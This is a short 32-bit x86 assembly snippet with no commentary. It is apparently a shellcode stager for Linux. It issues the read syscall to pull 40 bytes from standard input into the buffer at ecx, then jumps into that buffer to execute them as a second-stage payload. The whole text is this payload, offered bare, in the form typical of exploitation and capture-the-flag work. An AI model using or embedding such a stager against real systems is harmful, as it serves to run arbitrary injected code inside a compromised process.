[bits 32]

xor eax,eax
xor eax,eax
xor ebx,ebx
xor edx,edx
mov al,3
mov dl,40
int 0x80
jmp ecx


